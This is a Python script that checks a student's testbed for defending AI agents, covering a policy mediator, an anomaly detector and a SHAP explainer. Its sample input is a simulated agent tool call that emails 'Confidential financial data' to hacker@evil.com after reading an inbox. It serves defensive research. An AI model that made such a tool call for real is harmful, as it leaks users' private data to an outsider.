"""
Script 01: Verify Testbed Setup, Rules Loading, and Model Initialization.
"""

import sys
import os

# Add parent directory to path
sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), "..")))

from src import PolicyMediator, AnomalyDetector, FeatureExtractor, AnomalyExplainer

def main():
    print("==================================================")
    print(" Two-Layer Agentic AI Security: Testbed Audit")
    print(" University of the West of Scotland (UWS)")
    print(" Student: Sanil Giri (B01850720)")
    print("==================================================\n")

    # 1. Test Layer 1 Policy Mediator
    print("[1/4] Initializing Layer 1 Policy Mediator...")
    mediator = PolicyMediator(rules_dir="rules")
    print(f"      -> Loaded environments: {list(mediator.rules.keys())}")
    
    # Test sample banking call
    dec, reason = mediator.evaluate("banking", "transfer_funds", {"amount": 500.0, "payee": "Alice Smith"})
    print(f"      -> Normal Transfer Test: [{dec}] {reason}")
    dec_bad, reason_bad = mediator.evaluate("banking", "transfer_funds", {"amount": 5000.0, "payee": "Alice Smith"})
    print(f"      -> Over-Limit Transfer Test: [{dec_bad}] {reason_bad}")

    # 2. Test Feature Extractor
    print("\n[2/4] Initializing Environment-Neutral Feature Extractor...")
    extractor = FeatureExtractor()
    sample_vec = extractor.extract(
        tool_name="send_email",
        args={"to": "hacker@evil.com", "body": "Confidential financial data"},
        trace_history=[{"tool": "read_inbox", "args": {}}],
        is_tainted=True
    )
    print(f"      -> Extracted {len(sample_vec)} features from sample tool call.")
    print(f"      -> Vector preview: {[round(x, 2) for x in sample_vec[:5]]}...")

    # 3. Test Layer 2 Isolation Forest Detector
    print("\n[3/4] Initializing Layer 2 Isolation Forest Anomaly Detector...")
    detector = AnomalyDetector()
    is_anomaly, score = detector.predict(sample_vec)
    print(f"      -> Sample Prediction: Anomaly={is_anomaly}, Anomaly Score={score:.4f} (Threshold={detector.threshold})")

    # 4. Test SHAP Explainer
    print("\n[4/4] Initializing SHAP Interpretability Explainer...")
    explainer = AnomalyExplainer()
    explanation = explainer.explain(sample_vec, score)
    print(f"      -> Interpretation: {explanation['interpretation']}")
    for f in explanation["top_contributing_features"]:
        print(f"         * {f['feature']} (val: {f['value']}) -> SHAP Impact: {f['shap_impact']}")

    print("\n[SUCCESS] Testbed environment and defense modules are fully operational!\n")

if __name__ == "__main__":
    main()
